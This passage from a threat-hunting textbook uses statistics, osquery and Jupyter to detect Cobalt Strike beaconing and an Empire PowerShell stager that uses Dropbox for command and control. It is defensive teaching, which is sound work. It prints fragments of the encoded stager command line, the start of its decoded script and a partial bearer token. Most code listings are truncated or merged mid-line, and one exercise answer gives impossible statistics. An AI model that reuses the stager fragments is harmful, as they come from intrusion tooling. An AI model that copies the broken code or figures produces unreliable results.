Let us have a closer look at the content of stream:http events with uri_path set to /submit.php or /cm.
Listing 6.31 Web event with uri_path set to /cm
{
"sourcetype":"stream:http",
...
"bytes":510,
"bytes_in":395,
"bytes_out":115,
"cookie":"BYbgQMMwq1YiTaHxCX6SrnOYpf7R2qnlx5qwQl4IiiCLIR9RDq12RokO "dest_ip":"34.125.188.180",
...
"dest_port":80,
...
...
"http_content_length":0,
"http_content_type":"application/octet-stream",
"http_method":"GET",
"http_user_agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5
"protocol_stack":"ip:tcp:http",
"site":"34.125.188.180", "src_ip":"10.0.0.4", ...
"src_port":62228, "status":200,
...
"transport":"tcp", "uri_path":"/cm",
...
}
(This output is edited for brevity.)
At the beginning of this chapter, we reviewed the structure and fields in stream:http events. Please refer to Listing 6.3 if you need to revisit these events.
Listing 6.32 Web event with uri_path set to /submit.php
{
"sourcetype":"stream:http",
...
"bytes":1573421,
"bytes_in":1573321,
"bytes_out":100,
"dest_ip":"34.125.188.180",
...
"dest_port":80,
...
"http_content_length":0,
"http_content_type":"text/html",
"http_method":"POST",
"http_user_agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5
"protocol_stack":"ip:tcp:http",
"site":"34.125.188.180", "src_ip":"10.0.0.4",
...
"src_port":51873, "status":200,
...
"transport":"tcp",
"uri_path":"/submit.php",
...
}
(This output is edited for brevity.)
Listings 6.31 and 6.32 show that requests were made from a client with a
Windows-based user agent, Mozilla/4.0 (compatible; MSIE 8.0;
Windows NT 5.1; Trident/4.0; InfoPath.2; .NET CLR 2.0.50727).
However, we know by now that we cannot trust this field to be authentic. An adversary can choose any string as a user agent when making web requests.
The request to /cm is of type GET, while the request to /submit.php is of type POST. A quick search in our datastore reveals that this is the case for all the other events, as shown in Listings 6.33 and 6.34.
Listing 6.33 Humio search code - Search for 34.125.188.180 in events with sourcetype stream:http with uri_path set to /submit.php or /cm
sourcetype=stream:http 34.125.188.180
 "uri_path"="/submit.php" or "uri_path"="/cm"
| groupby(["uri_path", "http_method"])
Listing 6.34 Humio search output - Events of sourcetype stream:http containing 34.125.188.180 with uri_path set to /submit.php or /cm
uri_path     http_method     _count
/submit.php  POST            73
/cm          GET             677
The next thing to do is find out the level of consistency of connections identified by Stream as http. For that, we will revisit the calculation we built earlier using the Jupyter Notebook: find the standard deviations for all connections between 10.0.0.4 and 34.125.188.180, then break that down into http and unknown.
Listings 6.35 and 6.36 are for all connections between 10.0.0.4 and
34.125.188.180 over port 80.
Listing 6.35 Jupyter notebook code - Calculate the standard deviation for all values of app
unique_df_specific = unique_df.loc[(unique_df['src_ip'] == '10.0.0 unique_df_specific['std1']
Executing the code shows that the standard deviation is 297.176235. Let us look at the time difference between connections over time.
Listing 6.36 Jupyter notebook code - Time difference in seconds between connections over time for all values of app
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188 Executing the code in Listing 6.36 generates the graph shown in Figure 6.6.
Figure 6.6 Time difference in seconds between connections over time for all values of app

In Figure 6.6, the x-axis represents date and time, and the y-axis represents the value of time_diff_sec.
Listings 6.37 and 6.38 are for all connections between 10.0.0.4 and
34.125.188.180 over port 80 with app set to http.
Listing 6.37 Jupyter notebook code - Calculate the standard deviation for connections with app set to http
df['std1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port', \ 'app' df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188
Executing the above code shows that the standard deviation is 180.24353. Let us look at the time difference between connections over time.
Listing 6.38 Jupyter notebook code - Time difference in seconds between connections over time for app set to http
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188 Executing the code in Listing 6.38 generates the graph shown in Figure 6.7.
Figure 6.7 Time difference in seconds between connections over time for app set to http

In Figure 6.7, the x-axis represents date and time, and the y-axis represents the value of time_diff_sec.
Figure 6.7 reveals clear consistency in the value of time_diff_sec, ~60 seconds between 02:00 and 14:00 on the 27th of July, followed by fluctuations in the value of time_diff_sec (after 14:00).
Listings 6.39 and 6.40 are for all connections between 10.0.0.4 and
34.125.188.180 over port 80 with app set to unknown.
Listing 6.39 Jupyter notebook code - Calculate the standard deviation for connections with app set to http
df['std1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port', \ 'app' df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188
Executing the above code shows that the standard deviation is 238.169919. Let us look at the time difference between connections over time.
Listing 6.40 Jupyter notebook code - Calculating standard deviation for app set to unknown
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188
Figure 6.8 shows the distribution of time_diff_sec for connections with app set to unknown. The time interval between connections oscillates between some low value and 60 seconds.
Figure 6.8 Time difference in seconds between connections over time for app set to unknown

In Figure 6.8, the x-axis represents date and time, and the y-axis represents the value of time_diff_sec.
In Listing 6.41, we look at the distribution of time_diff_sec values by generating a histogram.
Listing 6.41 Jupyter notebook code - Generate a histogram showing the distribution of time_diff_sec for app set to unknown
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188 Executing the code in Listing 6.41 generates the graph shown in Figure 6.9.
Figure 6.9 Distribution of time_diff_sec for app set to http

In Figure 6.9, the x-axis represents date and time, and the y-axis represents the value of time_diff_sec. Figure 6.6 shows that the time interval between connections is mostly 60 seconds. Figure 6.9 shows the distribution of time_diff_sec for connections with app set to unknown. The time interval between most of the connections is around 1 second.
In Listing 6.42, we look at the distribution of time_diff_sec values by generating a histogram.
Listing 6.42 Jupyter notebook code - Generate a histogram showing the distribution of time_diff_sec for app set to unknown
df.loc[(df['src_ip'] == '10.0.0.4') &(df['dest_ip'] == '34.125.188 Executing the code in Listing 6.41 generates the graph shown in Figure 6.10.
Figure 6.10 Distribution of time_diff_sec for app set to unknown

In Figure 6.10, the x-axis represents date and time, and the y-axis represents the value of time_diff_sec. Figure 6.10 shows that the time interval between connections is mostly 1 second.
By now, we have a few signs that drive us to believe that 10.0.0.4 is connecting to a C2 server:
 Regular connections (every 60 seconds or 1 second) to a public IP address that does not have domains or known services associated with it.  The HTTP URI path in these requests are for /cm and /submit.php
A quick search on VirusTotal, shown in Figure 6.11, reveals that only two security vendors, out of many, associate 34.125.188.180 with malware.
Figure 6.11 VirusTotal report on 34.125.188.180

Selecting the community tab reveals that a contributor, drb_ra, reports that the IP address hosts a Cobalt Strike server, as shown in Figure 6.12.
Figure 6.12 VirusTotal community comments on 34.125.188.180

With this information, we can drill further to determine what process(es) on
10.0.0.4 establishes these consistent connections to 34.125.188.180.
Recall that we have access to osquery. Using osquery, we can run a remote query against 10.0.0.4 requesting information about processes establishing network connections to 34.125.188.180.
Listing 6.43 shows the osquery command for listing processes connecting to
34.125.188.180.
Listing 6.43 Osquery code - listing processes connecting to 34.125.188.180
SELECT DISTINCT   pos.pid,
  p.name,   pos.local_address,   pos.local_port,   pos.remote_address,   pos.remote_port FROM   processes p
  JOIN process_open_sockets pos USING (pid) WHERE   pos.remote_address like "%34.125.188.180%"                      
Running the query against the endpoint does not return anything. Why is that?
This is because the query looks for open sockets maintained in the process_open_sockets table, and at the time of running the query, the beaconing connection might not be active anymore. To solve this problem, we have to run the query multiple consecutive times. We know that the endpoint 10.0.0.4 connects a few times every 60 seconds to
34.125.188.180, so running the query multiple times will eventually provide us with information about the Windows process that established it.
Listing 6.44 Osquery output - Information about the processes connecting to 34.125.188.180
pid: 9688                                                         name: powershell.exe                                              local_address: 10.0.0.4 local_port: 54063 remote_address: 34.125.188.180 remote_port: 80
(This output is reformatted for a better presentation.)
There is malicious activity on the system in which a PowerShell connects to
34.125.188.180 over port 80. We have high confidence that the endpoint, 10.0.0.4, has been compromised. We have PowerShell connecting to an external IP address tagged as hosting a Cobalt Strike server.
Created Cobalt Strike in 2012, Cobalt Strike is an adversary simulation tool that adversaries have weaponized to gain a foothold on a target network and download and execute malicious payloads
Performing an Internet web search confirms that web requests for /cm and /submit.php, identified earlier in the hunt, are typical ones used by the Cobalt Strike Beacon agent (https://unit42.paloaltonetworks.com/cobaltstrike-malleable-c2-profile).
As a threat hunter, you can continue your investigation to uncover when and how the endpoint was compromised. In addition, you need to open an incident case if you have not done that yet and follow the incident response process.
Engage and support other team members who would handle the case and coordinate with other team members as necessary. Follow the threat hunting process that we used in the previous chapters.
With this, we conclude the hunting expedition using basic statistical constructs. In the next chapter, we learn how to use more sophisticated constructs to uncover other signs of malicious behaviors. You may continue to the next chapter or take a break to walk the dog!
6.2 Exercise
Using the chapter's dataset uploaded to GitHub, for connections between
10.0.0.6 and 208.80.154.224:
1. Calculate the number of connections
2. Calculate the standard deviation and variance values for the time each consecutive connection
3. Generate a line-type graph that shows the value of the time difference between connections over time (similar to Figure 6.4)
4. Generate a histogram that shows the distribution of the time difference between connections (similar to Figure 6.5)
Note
You may use Jupyter Notebooks or other tools of your preference.
6.3 Answers to Exercise
1. There were 4287 connections between and and 208.80.154.224.
2. The standard deviation is 6104.181532, and the variance is
78.129262.
3. Use the following code to generate the type-line graph.
Listing 6.45 Jupyter notebook code - Time difference between connections over time
df.loc[(df['src_ip'] == '10.0.0.6') &(df['dest_ip'] == '208.80.154 Executing the code in Listing 6.45 generates the graph shown in Figure 6.13.
Figure 6.13 Time difference in seconds over time for connections between 10.0.0.6 and
208.80.154.224 over port 443

4. Use the following code to generate the histogram.
Listing 6.46 Jupyter notebook code - Distribution of the time difference between connections
df.loc[(df['src_ip'] == '10.0.0.6') &(df['dest_ip'] == '208.80.154 Executing the code in Listing 6.46 generates the graph shown in Figure 6.14.
Figure 6.14 Distribution of time_diff_sec between 10.0.0.6 and 208.80.154.224 over port 443

6.4 Summary
 Statistics is a robust science that threat hunters can harness. Threat hunters can use it at any stage of your threat hunting expedition to analyze your findings and investigate further, whether to uncover initial clues or in the middle of an expedition.
 We do not expect threat hunters to become expert statisticians.
  Experimenting with some statistical constructs would help threat hunters build knowledge, which they can take gradually to production.  Learning new concepts and building new skills are key to your success as a threat hunter.
 External tools such as Jupyter Notebooks provide you access to a broader set of analytical functions built using universal programming languages such as Python.
 Knowledge of Python allows you to extend your toolset beyond the search capabilities supplied by your datastore. Similarly, reading and constructing SQL commands is very handy for tasks using tools such as osquery or conducting a database-related hunting expedition.
7 Tuning Statistical Logic
This chapter covers
 Understanding how to tune statistical constructs to create better security analytic capabilities, building on the fundamentals we covered in
Chapter 6
 Practicing threat hunting to uncover malicious beaconing when the adversary introduces random time jitter to beaconing connections to bypass detection logic such as the one we built in Chapter 6
 Practicing threat hunting when unexpected channels of communication are used by an adversary to establish command and control  Capturing packets in your threat hunting expedition to gain further visibility on what could be a threat execution
In this chapter, you will learn and practice building and using more involving statistical constructs in your threat-hunting expeditions.
In the first scenario, we introduce random time jitter to beaconing to demonstrate that using only standard deviation, similar to Chapter 6, is insufficient to uncover such behavior. We introduce new statistical techniques that can enhance analytical capabilities to uncover anomalies.
In the second scenario, we describe how to use density distribution functions to detect data exfiltration. We introduce density distribution functions, describe how to use them for anomaly detection, and then practically apply them to uncover outliers.
You might want to listen to The Empire Strikes Back (Star Wars Episode V) soundtrack in the background if you are a fan of Star Wars while we go through the first scenario: uncovering beaconing with random jitter. Why? All will be revealed as we proceed through the scenario.
7.1 Beaconing with random jitter
In Chapter 6, we uncovered a very consistent malicious beaconing activity.
The infected machine connects to the C2 server every ~60 seconds using HTTP, resulting in a very low standard deviation for connections between an internal IP address, 10.0.0.4, and an external IP address, 34.125.188.180.
Can the same techniques from Chapter 6 uncover malicious beaconing if the time between connections is not that consistent?
In this scenario, let us consider the case of an adversary introducing jitter, a random amount of time that gets added to the sleep time of an agent before making a call home to a C2. Based on what we uncovered in Chapter 6, we can conclude that the jitter was ~0% since the time between connections was extremely consistent.
With jitter added, this is not the case anymore. For example, 60 seconds of sleep with 20% jitter would result in a uniformly random sleep time distribution between 48 and 72 seconds.
In this scenario, we have access to a new set of events that capture TCP and UDP connection information, covering all ports. These events are available in our datastore, Humio. We also have access to events containing payloads of HTTP connections. You may refer to Chapter 6 for sample events. In addition, osquery is installed and running on the endpoints. Lastly, we can capture packets if required during our expedition.
Let us start by applying the same statistical techniques we used in Chapter 6 to find out if we will be able to uncover some initial clues.
7.1.1 Relying on standard deviation only
In Chapter 6, we analyzed connections between source and destination IP addresses in events and calculated the variance and standard deviation for every pair of IP addresses with a high count. We then selected pairs that display low values of variance and standard deviation.
Let us run the same logic against our new data set to hunt for malicious beaconing activities, if any exist! For completeness, Listing 7.1 contains the code from Chapter 6.
Listing 7.1 Jupyter notebook code - Searching for beaconing activities
import humioapi import pandas as pd
 
api = humioapi.HumioAPI(**humioapi.humio_loadenv()) stream = api.streaming_search(
    query="@sourcetype=stream:tcp OR @sourcetype=stream:udp \
    | findTimestamp(field=timestamp, as=epoch_timestamp) \
    | findTimestamp(field=endtime, as=epoch_endtime) \
    | select([epoch_timestamp, epoch_endtime, host.name, sourcetyp     repo='Threat_Hunting',     start="-7d@d",     stop="now"
)
df = pd.DataFrame(stream)
 
count_threshold=100
df = df.groupby(['src_ip', 'dest_ip', 'dest_port']).filter(lambda df = df.reset_index()
 
df = df.sort_values(by=['epoch_timestamp'], ascending=True) df['epoch_timestamp'] = df['epoch_timestamp'].astype(int) df['epoch_endtime'] = df['epoch_endtime'].astype(int) df['bytes'] = df['bytes'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int)
 
df['time_diff_msec'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['time_diff_sec'] = df['time_diff_msec'].div(1000)
 
df['std1'] = df.groupby(['src_ip', 'dest_ip', \  'dest_port'])['ti df['var1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['count1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['t
 
df['date'] = pd.to_datetime(df['epoch_timestamp'],unit='ms')
 
unique_df = df.drop_duplicates(['src_ip', 'dest_ip', 'dest_port'])
 
unique_df = df.drop_duplicates(['src_ip', 'dest_ip', 'dest_port'])
 
std_threshold = 100
unique_df = unique_df.loc[unique_df['std1'] < \ std_threshold].sor
 
unique_df[['src_ip', 'dest_ip', 'dest_port', 'std1', 'var1', 'coun
(Please refer to Chapter 6 for more details about the code)
Executing the code in Listing 7.1 generates a number of connections with low variance and standard deviation values. A snapshot of these connections is shown in Figure 7.1.
Figure 7.1 Snapshot showing columns in DataFrame unique_df


Let us filter out connections that we know are benign based on information we collected in Chapter 6 and in this chapter.
Listing 7.2 Jupyter notebook code - Exclude benign traffic by destination IP address
unique_df.loc[
   (unique_df['src_ip'].str.startswith('10.')) \                  
    & (unique_df['dest_port'] != "9997") \                        
    & (~unique_df['dest_ip'].str.endswith(".255")) \              
    & (~unique_df['dest_ip'].str.contains("20.7.1")) \            
    & (~unique_df['dest_ip'].str.contains("20.7.2")) \            
    & (~unique_df['dest_ip'].str.contains("20.10.31.115")) \      
    & (~unique_df['dest_ip'].str.contains("168.63.129.16")) \     
    & (~unique_df['dest_ip'].str.contains("169.254.169.254")) \   
    & (~unique_df['dest_ip'].str.contains("239.255.255.250")) \   
    ].sort_values(by=['std1'], ascending=True)
Executing the above code returns no results. There are no other unknown beaconing activities. So, are we done here? It can't be, right? Not because we are at the beginning of the chapter but because an adversary might have added jitter to the callback connections, resulting in potentially higher values of variance and standard deviation. The logic might have resulted in a false negative situation in which a threat got executed, but the system did not report it.
7.1.2 Enhancing the analytic techniques with interquartile range
Let us update our hypothesis: an adversary was able to take control of one or more internal hosts, which then started to beacon with jitter added to a C2 server using any TCP or UDP port. We do not know the time interval between the call-home connections or the percentage of jitter added.
Generally, standard deviation works well to uncover anomalies in data with normal distribution, in which data distribution has a bell curve shape, such as the ones in Figure 7.2. You notice that the tighter the values, the lower the standard deviation, indicating higher consistency. The wider the spread, the higher the standard deviation value, indicating less consistency.
Figure 7.2 Normal distribution graphs with different standard deviation values

In chapter 6, the values for the variable time_difference_sec were tightly packed, as shown in Figure 7.3, resulting in a low standard deviation value, but does not reflect the bell shape we see in Figure 7.2. We refer to the distribution in Figure 7.3 as bimodal, i.e., a distribution with two peaks.
Figure 7.3 Distribution of time_diff_sec , taken from Chapter 6

With the adversary introducing jitter to the call home connections, the distribution might look different. We don't know what the distribution might look like, at least not yet.
It is time to introduce the interquartile range (IQR), an approach we can deploy to eliminate outliers before calculating the variance and standard deviation. Applying IQR eliminates noise by focusing on values between the lower and upper quartiles, making IQR less sensitive than just using standard deviation to outliers and skewed data.
Quartiles are values that divide an ordered list of numbers into quarters.
There are three quartile values: lower quartile, median, and upper quartile. They divide a data set of numbers into four ranges, each containing 25% of the data points. The median is the middle number in an ordered data set. Think about the median as the value that cutes a data set of numbers in half.
In practice, not all data exhibits a normal distribution such as the ones in Figure 7.2. Most would not have such unified distribution. The box plot in Figure 7.3 shows the quartiles for a distribution.
Figure 7.4 Quartiles for a non-normal distribution

Skewed data refers to a distribution in which data trail off more sharply on one side than on the other. To illustrate what a skew distribution looks like, Figure 7.4 shows a left-skewed distribution, with the tail showing on the left of the figure and the box plot showing the 1st, 2nd and 3rd quantiles on the right of the figure.
Figure 7.5 Quartiles for a left-skewed distribution

The lower quartile, also known as the first quartile, is the value under which 25% of data points are found when arranged in ascending order. In contrast, the upper quartile, also known as the third quartile, is the value under which 75% of data points are found when arranged in ascending order.
So instead of calculating the standard deviation for all the values of time_diff_sec, we will calculate it for the values between the lower and upper quartiles (25% - 75%).
We first need to determine the values of the 25th and 75th quantiles by executing the code at the bottom of Listing 7.3. For completeness, we provide the full code in Listing 7.3. Quantile comes from the word quantity; they are used to determine how many values in an ordered list are above or below a certain limit. You can think of quartiles, defined earlier, as special quantiles.
Listing 7.3 Jupyter Notebook code - Calculate the lower and upper quartiles
import humioapi import pandas as pd
 
api = humioapi.HumioAPI(**humioapi.humio_loadenv()) stream = api.streaming_search(
    query="@sourcetype=stream:tcp OR @sourcetype=stream:udp \
    | findTimestamp(field=timestamp, as=epoch_timestamp) \
    | findTimestamp(field=endtime, as=epoch_endtime) \
    | select([epoch_timestamp, epoch_endtime, host.name, sourcetyp     repo='Threat_Hunting',     start="-7d@d",     stop="now"
)
df = pd.DataFrame(stream)
 
count_threshold=100
df = df.groupby(['src_ip', 'dest_ip', 'dest_port']).filter(lambda df = df.reset_index()
 
df = df.sort_values(by=['epoch_timestamp'], ascending=True) df['epoch_timestamp'] = df['epoch_timestamp'].astype(int) df['epoch_endtime'] = df['epoch_endtime'].astype(int) df['bytes'] = df['bytes'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int)
 
df['time_diff_msec'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['time_diff_sec'] = df['time_diff_msec'].div(1000)
 
df['lower_quartile'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po df['upper_quartile'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_po
We then drop all the values below the 25th quantile and above the 75th quantile.
Listing 7.4 Jupyter notebook code - Drop rows with values of time_diff_sec outside the IQR
df = df.drop(df[(df['time_diff_sec'] < df['lower_quartile'])].inde df = df.drop(df[(df['time_diff_sec'] > df['upper_quartile'])].inde
Now that we have values that fall within the IQR based on src_ip, dest_ip and dest_port, it's time to calculate the standard deviation and variance values, again based on src_ip, dest_ip, and dest_port.
Listing 7.5 Jupyter notebook code - Calculate standard deviation, variance, and number of connections per src_ip, dest_ip and dest_port
df['std1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['var1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['tim df['count1'] = df.groupby(['src_ip', 'dest_ip', \ 'dest_port'])['t
We calculated all that we need, so let us drop duplicates sharing the same src_ip, dest_ip, and dest_port, and store the results in a new DataFrame, unique_df.
Listing 7.6 Jupyter notebook code - Drop duplicate rows based on src_ip,dest_ip, and dest_port
unique_df = df.drop_duplicates(['src_ip', 'dest_ip', 'dest_port'])
Similar to the logic we applied in Chapter 6, we search for connections with a low standard deviation value. The difference, again, is that we are applying this logic to values that fall within the IQR.
Listing 7.7 Jupyter notebook code - Keep rows with low standard deviation values
std_threshold = 100 unique_df = unique_df.loc[unique_df['std1'] < \ std_threshold].sor
It is time to filter out connections that we know are benign based on information we collected in Chapter 6 and in this chapter and find out if anything else shows up this time.
Listing 7.8 Jupyter notebook code - Exclude benign traffic by destination IP address
unique_df.loc[
   (unique_df['src_ip'].str.startswith('10.')) \
    & (unique_df['dest_port'] != "9997") \
    & (~unique_df['dest_ip'].str.endswith(".255")) \
    & (~unique_df['dest_ip'].str.contains("20.7.1")) \
    & (~unique_df['dest_ip'].str.contains("20.7.2")) \
    & (~unique_df['dest_ip'].str.contains("20.10.31.115")) \
    & (~unique_df['dest_ip'].str.contains("168.63.129.16")) \
    & (~unique_df['dest_ip'].str.contains("169.254.169.254")) \
    & (~unique_df['dest_ip'].str.contains("239.255.255.250")) \
    ].sort_values(by=['std1'], ascending=True)
Executing the code in Listing 7.8 returns a list of connections exhibiting low values of IQR that we have not seen before, shown in Listing 7.9.
Listing 7.9 Jupyter notebook output - Rows with std1 < std_threshold
src_ip      dest_ip       dest_port std1        count1
10.0.0.18   162.125.2.14  443       27.938200   119
10.0.0.4    162.125.2.14  443       56.714351   94 10.0.0.15   40.87.160.0   23456     58.184749   96 10.0.0.18   40.87.160.0   23456     62.555033   99
10.0.0.9    40.87.160.0   23456     72.831374   85 10.0.0.12   40.87.160.0   23456     75.213569   101
10.0.0.8    40.87.160.0   23456     75.703240   82 10.0.0.16   40.87.160.0   23456     84.876234   79 10.0.0.13  40.87.160.0    23456     84.899078   84
10.0.0.4    40.87.160.0   23456     94.670942   73
The output shows two destination IP addresses, 162.125.2.14 and
40.87.160.0. These IP addresses did not show earlier when we did not use IQR. As usual, we need to investigate the connections to these two IP addresses to confirm if these are regular connections to standard known services, i.e., benign traffic, or are connections that we should be concerned about.
7.1.3 Interrogating the first suspect, 162.125.2.14
We start with the destination IP address 162.125.2.14. There are two internal source IP addresses involved, 10.0.0.18 and 10.0.0.4. In listing 7.10, we retrieve details about connections between 10.0.0.18 and 162.125.2.14. We could have performed a similar search on our datastore as well.
Listing 7.10 Jupyter notebook code - Retrieve details about connections between 10.0.0.18 and
162.125.2.14
unique_df.loc[(unique_df['src_ip'] == '10.0.0.18') & (unique_df['d
The output in Listing 7.11 shows that Splunk Stream identified traffic between 10.0.0.18 and 162.125.2.14 over port TCP/443 as dropbox. There are 119 connections with time_diff_sec values that fall within the IQR, with a low standard deviation of 27.9382.
Listing 7.11 Jupyter notebook code - Details about connections between 10.0.0.18 and
162.125.2.14
src_ip: 10.0.0.18 dest_ip: 162.125.2.14 dest_port: 443 app: dropbox std1: 27.9382 lower_quartile: 50.326 upper_quartile: 156.626 var1: 780.543003 count: 119
Let us run the same for connections between 10.0.0.4 and 162.125.2.14. In Listing 7.12, we retrieve details about connections between 10.0.0.4 and 162.125.2.14.
Listing 7.12 Jupyter notebook code - Retrieve details about connections between 10.0.0.4 and
162.125.2.14
unique_df.loc[(unique_df['src_ip'] == '10.0.0.4') & (unique_df['de
The output in Listing 7.13 shows that Splunk Stream identified traffic between 10.0.0.4 and 162.125.2.14 over port TCP/443 as dropbox. There are 94 connections with time_diff_sec values that fall within the IQR and with a low standard deviation of 56.714351.
Listing 7.13 Jupyter notebook code - Details about connections between 10.0.0.4 and
162.125.2.14
src_ip: 10.0.0.4 dest_ip: 162.125.2.14 dest_port: 443
app: dropbox std1: 56.714351 lower_quartile: 47.1005 upper_quartile: 266.3275 var1: 3216.517583 count: 94
In summary, the outputs in Listings 7.11 and 7.13 show that we have consistent connections from two internal machines, 10.0.0.18 and 10.0.0.4. According to the app field, Splunk Stream profiled these connections as dropbox.
According to Cisco Umbrella, 162.125.2.14 is part of BGP Autonomous System (AS) 19679 with the prefix 162.125.0.0/16, which belongs to Dropbox. This is shown in the Cisco Umbrella snapshot in Figure 7.6.
Figure 7.6 Cisco Umbrella snapshot showing that 162.125.2.14 belongs to an Autonomous
System Number (ASN) owned by Dropbox

162.125.2.14 hosts the domain edge-block-api-env.dropbox-dns.com, as shown in Figure 7.7, taken from Cisco Umbrella.
Figure 7.7 Cisco Umbrella snapshot showing the domains that 162.125.2.14 host

So far, nothing is weird or suspicious, right? Users on these two internal endpoints could have simply installed the Dropbox client application, resulting in consistent connections to Dropbox. It is normal for a Dropbox client to connect to the Dropbox servers regularly to test and report the connectivity status or synch files, a network behavior that you as a hunter might have seen before with file sharing tools such as Dropbox, Box, Google Drive, etc.
Should we call this normal and move on to investigate the second destination IP address, 40.87.160.0, or should we investigate these connections further?
Avoid confirmation bias
As a threat hunter, be meticulous and never let cognitive biases take control of your conclusions. As we learned in Chapter 2, confirmation bias refers to the tendency to search for or interpret information in a way that confirms one's preconceptions and discredits information that does not support the initial opinion. Threat hunters should not fall into confirmation bias by ignoring or discarding information or suggestions contradicting their hypothesis.
To confirm that there is nothing suspicious with the connections to Dropbox, we pivot to osquery and try to answer the following question: which process is making connections to 162.125.2.14? If everything is normal, then we expect to see the a Dropbox process making the connections.
Let us check if the Dropbox client is running on 10.0.0.4. The code in Listing 7.14 searches for process names or command lines containing the string dropbox.
Listing 7.14 Osquery code - Listing processes and command lines containing the string dropbox
SELECT  
  name, cmdline                                                   FROM 
  processes                                                       WHERE   name LIKE ('%dropbox%') OR cmdline LIKE ('%dropbox%');          
The query returns no results, which indicates that there were no processes with name or command line containing the string dropbox when we executed the query. So, what other process would connect to 162.125.2.14? Could it still be a genuine Dropbox process but renamed to something else? To answer this question, let us determine which processes have active connections to destination IP addresses containing 162.125.
Listing 7.15 Osquery code - List processes with connection to IP addresses containing 162.125
SELECT DISTINCT   pos.pid,
  p.name,
  p.cmdline,   pos.local_address,   pos.local_port,   pos.remote_address,   pos.remote_port FROM
  processes p JOIN 
  process_open_sockets pos USING (pid) WHERE   pos.remote_address LIKE ('%162.125%')                           Listing 7.16 shows the output of executing the command on the endpoint.
Listing 7.16 Information about processes connecting to IP addresses containing 162.125
pid: 9444                                                         name: powershell.exe                                              cmdline: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.ex
    ...
    VgArACQASwApACkAfABJAEUAWAA=                                  local_address: 10.0.0.4 local_port: 52326
remote_address: 162.125.2.14 remote_port: 443
(This output is edited for brevity and reformatted for a better presentation.)
Wait a minute! The output shows PowerShell executing an encoded command that connects to Dropbox! In the command line:
-noP instructs PowerShell not to load an existing profile sta instructs PowerShell to use a single-threaded apartment w 1 instructs PowerShell to hide the window
-enc is used to pass a base64 encoded string to PowerShell
Let us try and decode the rest of the command to find out what is happening here. To decode the Base64 command, you can use an online tool (e.g., https://gchq.github.io/CyberChef). If you are not comfortable uploading the content to a public tool, you can consider using a Python or shell script to decode the command, or download a local copy of https://gchq.github.io/CyberChef from the same link under Download CyberChef.
Listing 7.17 Decoded PowerShell command
If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetT
There are a lot of things going on here. Let us go through the most important content in this interesting output:
 The variable u sets what seems to be a user agent to Mozilla/5.0
(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko, which gets added to the web requests header, $wc.Headers.Add('User-
Agent',$u);.
 The variable t contains a string, sl.BPd-
urNAcm0RX2ZvZC9fih5u6dDL9rbEQx6V5Thtce1dOlBi7--
aIgduonZ8CcHc1YuU5UCHcl_SSyy5ZVJOiXVFBQ4Nb3Wb6s_XFhkApbUSNSW5
used as a bearer token in an authorization header,
$wc.Headers.Add("Authorization","Bearer $t");.
 Dropbox-API-Arg is added to the header with its value set to
path":"/Empire/staging/debugps
 The web request is made to content.dropboxapi.com, which has a corresponding DNS Canonical Name (CNAME) of edge-block-apienv.dropbox-dns.com.
Definition
A bearer token is a string added in the HTTP Authorization header to authenticate API requests.
Our analysis of the output confirms that there is malicious activity on this endpoint, 10.0.0.4, which we picked up initially by using statistical analytics looking for beaconing.
It was a close call! If we didn't query the endpoint using osquery, we could have discarded these malicious connections and considered them benign!
What malicious code is this? A simple search reveals that the adversary used Empire (https://github.com/BC-SECURITY/Empire), a post-exploitation framework that manages compromised hosts, and that the PowerShell execution in Listing 7.16 is a stager used to download further code and allows an attacker to gain access to the compromised host.
Let us move to the next internal endpoint, 10.0.0.18, to find out if it has the Dropbox client running.
Listing 7.18 Osquery code - Listing processes containing the string dropbox
SELECT name, cmdline FROM processes WHERE name LIKE ('%dropbox%') OR cmdline LIKE ('%dropbox%');
The second endpoint, 10.0.0.18, has Dropbox processes running, as shown in Listing 7.19.
Listing 7.19 Osquery output - List of processes containing the string dropbox
Dropbox.exe
"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" /firstrun 1 /n
...
Dropbox.exe
"C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" --type=rendere ...
(This output is edited for brevity.)
The output confirms that Dropbox is installed on the machine, so nothing to worry about, right? Maybe and maybe not! Ignoring our confirmation bias, we will query the endpoint to confirm what processes connect to destination IP addresses containing 162.125.
Listing 7.20 Osquery code - List processes with connection to IP addresses containing 162.125
SELECT DISTINCT 
  pos.pid, p.name, p.cmdline, pos.local_address, pos.local_port, p FROM   processes p JOIN
  process_open_sockets pos
USING
  (pid) WHERE   pos.remote_address LIKE ('%162.125%')
The response from the endpoint in Listing 7.21 shows multiple entries with processes connecting to IP addresses containing 162.125.
Listing 7.21 Information about processes connecting to IP addresses containing 162.125
pid: 9864 name: Dropbox.exe
cmdline: "C:\Program Files (x86)\Dropbox\Client\Dropbox.exe" /syst local_address: 10.0.0.18 local_port: 61041 remote_address: 162.125.19.9 remote_port: 443
 pid: 9864 name: Dropbox.exe
